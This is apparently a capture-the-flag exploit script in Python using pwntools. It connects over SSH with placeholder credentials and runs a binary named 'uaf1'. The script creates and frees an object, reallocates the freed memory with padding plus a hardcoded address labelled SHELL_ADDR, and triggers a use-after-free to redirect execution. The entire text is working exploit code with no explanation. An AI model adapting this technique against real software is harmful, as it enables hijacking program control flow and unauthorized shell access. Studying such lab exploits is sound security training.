#!/usr/bin/env python3
import pwn
 
s = pwn.ssh('login',
            'host',
            password='password',
            port=12345)

SHELL_ADDR = 0x080487cb

p = s.process('uaf1')

### create
p.recvuntil(b'Quit')
p.sendline(b'1')
p.sendline(b'AAAA')

### free
p.recvuntil(b'Quit')
p.sendline(b'4')

### payload
p.recvuntil(b'Quit')
p.sendline(b'5')
payload = b'A'*12
payload += pwn.p32(SHELL_ADDR)
p.sendline(payload)
p.sendline(b'B'*8)

### UAF
p.recvuntil(b'Quit')
p.sendline(b'2')

print(p.recvline())
print(p.recvline())
p.close()

